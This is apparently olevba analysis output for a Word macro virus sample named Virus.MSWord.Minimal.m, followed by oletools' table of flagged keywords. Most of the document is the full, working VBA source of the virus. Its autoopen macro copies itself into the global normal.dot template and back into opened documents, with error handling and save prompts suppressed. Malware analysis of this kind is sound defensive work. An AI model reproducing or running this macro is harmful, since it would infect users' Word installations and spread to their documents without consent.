olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.m-62897ea1fe3e7a2f2c6cd6fc10052dd6543517c2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.m-62897ea1fe3e7a2f2c6cd6fc10052dd6543517c2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Minimal.m-62897ea1fe3e7a2f2c6cd6fc10052dd6543517c2 - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
Dim c$
Dim b_ As Object
a$ = "autoopen"
b$ = WordBasic.[FileName$]()
c$ = WordBasic.[DefaultDir$](2) + "\normal.dot"
Dim a_ As Object: Set a_ = WordBasic.DialogRecord.Organizer(False)
Set a_ = WordBasic.CurValues.Organizer
a_.Copy = 1
a_.Tab = 3
a_.Name = a$
a_.Source = b$
a_.Destination = c$
On Error Resume Next
WordBasic.Organizer a_
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
If WordBasic.CountMacros(1) = 0 Then
a_.Source = c$
a_.Destination = b$
WordBasic.Organizer a_
Set b_ = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.ScreenUpdating
WordBasic.DisableAutoMacros
WordBasic.FileOpen c$
Set b_ = WordBasic.CurValues.FileSaveAs
WordBasic.FileClose 2
WordBasic.DisableAutoMacros 0
b_.Name = WordBasic.[FileName$]()
WordBasic.FileSaveAs b_
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

